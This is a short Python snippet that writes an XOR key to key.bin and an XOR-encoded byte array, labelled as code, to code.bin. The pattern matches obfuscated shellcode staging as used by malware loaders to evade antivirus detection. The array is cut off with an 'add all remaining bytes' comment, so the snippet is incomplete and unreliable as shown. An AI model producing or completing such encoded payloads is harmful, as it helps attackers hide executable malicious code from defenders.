
# Save XORkey.bin
XOR_key = bytes([0xf6, 0xe5, 0xfe, 0x1, 0x22, 0x2c, 0x1d, 0xe9, 0x40, 0xa1, 0xe6, 0xa2, 0xd7, 0x1e, 0x45, 0xb4])
with open("key.bin", "wb") as f:
    f.write(XOR_key)

# Save XORcode.bin
XOR_code = bytes([0xa, 0xad, 0x7d, 0xe5, 0xd2, 0xc4, 0xdd, 0xe9, 0x40, 0xa1, 0xa7, 0xf3, 0x96, 0x4e, 0x17, 0xe5, 0xa0, 0xad, 0xcf, 0xd3, 0x47, 0x64, 0x96, 0xbb, 0x20, 0xe9, 0x6d, 0xf0, 0xcf, 0x56, 0xce, 0xe6, 0xd6, 0xad, 0x75, 0x73, 0x72, 0x64, 0x12, 0x5e, 0xa, 0xeb, 0xab, 0x93, 0x1e, 0x56, 0x74, 0x74, 0x5a, 0xd9, 0x9f, 0x7d, 0x20, 0x0, 0x3d, 0xa8, 0x81, 0x68, 0xeb, 0xe3, 0xd6, 0xdf, 0xa7, 0x59, 0xa4, 0xa4, 0xaf, 0x49, 0xa9, 0x7e, 0x3d, 0x62, 0x2, 0x9d, 0xae, 0xa3, 0x7, 0x95, 0xc5, 0x3c, 0xf6, 0xe5, 0xfe, 0x49, 0xa7, 0xec, 0x69, 0x8e, 0x8, 0xa0, 0x36, 0xf2, 0x5c, 0x56, 0x5d, 0xf0, 0x7d, 0xa5, 0xde, 0x48, 0x23, 0xfc, 0xfe, 0xbf, 0x8, 0x5e, 0x2f, 0xe3, 0x5c, 0x2a, 0xcd, 0xfc, 0xf7, 0x33, 0xb3, 0x30, 0xeb, 0x64, 0x2c, 0x29, 0xec, 0xe0, 0x27, 0x6b, 0xda, 0x5f, 0x44, 0x75, 0xce, 0x5, 0x8b, 0xf0, 0x6e, 0x2f, 0x51, 0xcd, 0x48, 0xe4, 0xdf, 0x73, 0xa2, 0xc6, 0x1d, 0xf0, 0x7d, 0xa5, 0xda, 0x48, 0x23, 0xfc, 0x7b, 0xa8, 0xcb, 0xad, 0xae, 0xe6, 0x5c, 0x5e, 0x59, 0xfd, 0xf7, 0x35, 0xbf, 0x8a, 0x26, 0xa4, 0x55, 0xe8, 0x90, 0xe0, 0xbe, 0xe3, 0x8f, 0x40, 0x1c, 0xee, 0xb7, 0xbd, 0xbf, 0x58, 0x63, 0x76, 0x55, 0x6a, 0xac, 0x81, 0xa7, 0xf0, 0x28, 0xfe, 0x1d, 0xf5, 0xaf, 0xbf, 0xb6, 0x8a, 0x30, 0xc5, 0x4a, 0x16, 0xbf, 0x5e, 0xbb, 0xeb, 0x69, 0x69, 0x36, 0x86, 0xa9, 0xd6, 0xcc, 0x1, 0x22, 0x6d, 0x4b, 0xa0, 0xc9, 0x47, 0xae, 0x23, 0x3b, 0xbe, 0x44, 0xb4, 0xf6, 0xac, 0x77, 0xe4, 0x6b, 0x90, 0x1f, 0xe9, 0x51, 0xfc, 0x26, 0xa, 0x55, 0x96, 0x4, 0xe0, 0xbf, 0x6c, 0x1a, 0x4d, 0xab, 0xdd, 0x5c, 0x53, 0xc, 0xd6, 0xc0, 0xa5, 0x28, 0xcb, 0x9, 0x3d, 0x1c, 0x8d, 0xff, 0x0, 0x22, 0x2c, 0x44, 0xa8, 0xfa, 0x88, 0x66, 0xc9, 0xd7, 0xe1, 0x90, 0xe4, 0xa6, 0xa8, 0xcf, 0xc8, 0x6f, 0x1d, 0xdd, 0xa1, 0xbf, 0x61, 0xae, 0x2b, 0x15, 0x56, 0xba, 0x74, 0xbe, 0x6c, 0x3f, 0x40, 0x98, 0xc6, 0x12, 0x36, 0xa0, 0x5e, 0x33, 0xea, 0x5e, 0xd9, 0x2f, 0xa4, 0xb7, 0xbd, 0xb2, 0x88, 0xc0, 0x64, 0x94, 0x10, 0x1, 0x1b, 0x7f, 0x7, 0xa3, 0x7f, 0xba, 0x61, 0xbe, 0x64, 0x3a, 0x41, 0x20, 0x2c, 0x1d, 0xa0, 0xf8, 0xc2, 0x8b, 0xc6, 0xd7, 0x1e, 0x45, 0xb4, 0xf6, 0xa4, 0xae, 0x40, 0x72, 0x64, 0x94, 0xb, 0x17, 0xf6, 0xb1, 0xef, 0xe6, 0xde, 0x2f, 0xb9, 0xaf, 0xa4, 0xae, 0xe3, 0xde, 0x4a, 0xda, 0xad, 0x64, 0xf5, 0xe7, 0xa3, 0x9f, 0x93, 0x1, 0x90, 0xee, 0x23, 0xfe, 0x69, 0x6a, 0xa5, 0xfb, 0xbf, 0x10, 0xe0, 0xb6, 0xe3, 0x87, 0x5f, 0x15, 0xfd, 0x9, 0x25, 0xbf, 0x51, 0x6b, 0xd3, 0xd5, 0xa4, 0xc9, 0x60, 0xaa, 0x2b, 0x16, 0x5f, 0xff, 0xcd, 0x3a, 0xda, 0x78, 0xfe, 0xf7, 0x64, 0x2c, 0x3b, 0x8, 0x5e, 0x2c, 0x29, 0xd9, 0x5f, 0xff, 0xbc, 0x71, 0xf8, 0x9e, 0xfe, 0xf7, 0x97, 0xed, 0x5c, 0xe2, 0xf7, 0xa7, 0x18, 0x71, 0x8b, 0xf8, 0x29, 0x9, 0x30, 0xb6, 0x82, 0xe6, 0x4, 0x21, 0xef, 0x3c, 0xab, 0x66, 0x59, 0x37, 0x6b, 0x40, 0xf, 0xb1, 0xf6, 0x8c, 0x6e, 0x48, 0x2c, 0x44, 0xa8, 0xc9, 0x7b, 0x19, 0x77])
    # ... (add all remaining bytes)
with open("code.bin", "wb") as f:
    f.write(XOR_code)
